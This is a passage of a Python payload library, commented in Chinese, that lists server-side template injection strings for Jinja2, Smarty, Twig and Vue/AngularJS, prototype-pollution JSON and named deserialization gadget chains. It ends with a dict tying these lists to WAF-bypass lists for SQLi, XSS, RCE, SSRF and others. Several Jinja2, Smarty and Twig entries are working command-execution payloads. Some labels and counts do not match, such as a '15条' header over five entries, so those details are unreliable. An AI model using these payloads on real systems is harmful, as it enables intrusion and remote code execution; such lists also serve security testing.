    # ← Jinja2/Flask
    {"name": "tmpl-jinja2-arith", "payload": "{{7*7}}", "bypass": "Jinja2 算术探测"},
    {"name": "tmpl-jinja2-7777777", "payload": "7777777 在响应中出现则存在注入", "bypass": "Jinja2 确认注入"},
    {"name": "tmpl-jinja2-c Import", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "bypass": "Poppy 链 RCE"},
    {"name": "tmpl-jinja2-attr", "payload": "attr_chain_payload", "bypass": "attr 链 RCE (disabled)"},
    {"name": "tmpl-jinja2-request", "payload": "{{request.application.__globals__['__builtins__']['__import__']('os').popen('id').read()}}", "bypass": "request 链"},
    # ← Smarty/PHP
    {"name": "tmpl-smarty-eval", "payload": "{php}echo `id`;{/php}", "bypass": "Smarty {php}"},
    {"name": "tmpl-smarty-literal", "payload": "{literal}alert(1){/literal}", "bypass": "Smarty {literal}"},
    {"name": "tmpl-smarty-if", "payload": '{if `id`}{/if}', "bypass": "Smarty {if 执行"},
    # ← Twig
    {"name": "tmpl-twig-arith", "payload": "{{7*7}}", "bypass": "Twig 算术探测"},
    {"name": "tmpl-twig-filters", "payload": "{{['id']|filter('system')}}", "bypass": "Twig filter"},
    {"name": "tmpl-twig-attr", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}", "bypass": "Twig filter callback"},
    {"name": "tmpl-twig-templ", "payload": "{{_self.env.getRuntime('Template').new('{{1+1}}').render()}}", "bypass": "Twig Template"},
    # ← Vue/Angular
    {"name": "tmpl-vue-arith", "payload": "{{7*7}}", "bypass": "Vue 算术探测"},
    {"name": "tmpl-vue-7777777", "payload": "7777777", "bypass": "Vue 结果确认"},
    {"name": "tmpl-vue-constructor", "payload": "{{constructor.constructor('alert(1)')()}}", "bypass": "Vue constructor"},
    {"name": "tmpl-angular-expr", "payload": "1+1", "bypass": "Angular 表达式探测"},
    {"name": "tmpl-angular-eval", "payload": "{{constructor.constructor('alert(1)')()}}", "bypass": "AngularJS SSTI"},
]


# ─────────────────────── 原型污染变异 (15条) ───────────────────────

PROTOTYPE_POLLUTION_PAYLOADS: List[Dict[str, str]] = [
    {"name": "proto-__proto__", "payload": '{"__proto__": {"polluted": "yes"}}', "bypass": "__proto__ 污染"},
    {"name": "proto-constructor-proto", "payload": '{"constructor": {"prototype": {"polluted": "yes"}}}', "bypass": "constructor.prototype"},
    {"name": "proto-merge", "payload": '{"__proto__": {"admin": true}}', "bypass": "__proto__ 权限提升"},
    {"name": "proto-array-proto", "payload": '{"length": {"__proto__": {"polluted": true}}}', "bypass": "length 维度"},
    {"name": "proto-taint-__proto__", "payload": 'a[b]=__proto__', "bypass": "非数组标记 __proto__"},
]


# ─────────────────────── 二进制/反序列化变异 (10条) ───────────────────────

DESER_PAYLOADS: List[Dict[str, str]] = [
    {"name": "deser-java-ysoserial", "payload": "ysoserial gadget chain", "bypass": "Java gadget"},
    {"name": "ysoserial-commons", "payload": "CommonsCollections1-7", "bypass": "Commons collection"},
    {"name": "ysoserial-rome", "payload": "ROME + JdbcRowSetImpl", "bypass": "Rome + JNDI"},
    {"name": "ysoserial-hibernate", "payload": "Hibernate + TemplatesImpl", "bypass": "Hibernate chain"},
    {"name": "deser-python-pickle", "payload": "pickle 字节流 __reduce__ 链", "bypass": "Pickle chain"},
    {"name": "deser-python-yaml", "payload": "yaml 反序列化 !!python/object/apply:os.system", "bypass": "yaml"},
    {"name": "deser-php-pop", "payload": "PHP POP 链 - Logger.__destruct -> callback", "bypass": "PHP POP"},
    {"name": "deser-php-phar", "payload": "Phar 文件 GIF89a 头", "bypass": "PHP phar"},
    {"name": "deser-python-marshal", "payload": "marshal.loads 执行", "bypass": "marshal"},
    {"name": "deser-netcs-objectState", "payload": "C# ObjectStateFormatter gadget", "bypass": "C# ObjectState"},
]


# ─────────────────────── 汇总与查询 ───────────────────────

ALL_PAYLOAD_VARIANTS: Dict[str, List[Dict[str, str]]] = {
    "sqli_waf_bypass": SQLI_WAF_BYPAYLOADS,
    "xss_waf_bypass": XSS_WAF_BYPAYLOADS,
    "rce_waf_bypass": RCE_BYPAYLOADS,
    "lfi_waf_bypass": LFI_BYPAYLOADS,
    "xxe_waf_bypass": XXE_BYPAYLOADS,
    "ssrf_bypass": SSRF_BYPAYLOADS,
    "auth_bypass": AUTH_BYPASS_PAYLOADS,
    "logic_bypass": LOGIC_BYPASS_PAYLOADS,
    "nosql_injection": NOSQL_PAYLOADS,
    "template_injection": TEMPLATE_INJECTION_PAYLOADS,
    "prototype_pollution": PROTOTYPE_POLLUTION_PAYLOADS,
    "deserialization": DESER_PAYLOADS,
}


def count_payloads() -> int:
    """统计所有 Payload 数量"""
    return sum(len(v) for v in ALL_PAYLOAD_VARIANTS.values())


def count_by_category() -> Dict[str, int]:
    """按分类统计"""
    return {k: len(v) for k, v in ALL_PAYLOAD_VARIANTS.items()}


PAYLOAD_COUNT: int = count_payloads()
